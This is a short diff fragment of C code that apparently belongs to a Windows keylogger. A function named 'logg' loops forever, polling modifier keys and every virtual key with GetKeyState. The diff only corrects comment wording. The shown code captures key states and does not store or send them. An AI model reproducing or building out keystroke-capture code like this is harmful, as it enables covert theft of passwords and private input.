@@ -18,7 +18,7 @@ DWORD WINAPI logg(){
 
 	//: running infinite
 	while(1){
-		//: take rest for 10 millisecond
+		//: 10 millisecond rest
 		Sleep(10);
 
 		//: get key state of CAPSLOCK,NUMLOCK
@@ -28,7 +28,7 @@ DWORD WINAPI logg(){
 		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
 		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;
 
-		//: cheking state of all virtual keys
+		//: checking state of all virtual keys
 		for(vkey=0;vkey<0xFF;vkey++){
 			isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
 			showKey=(char)vkey;
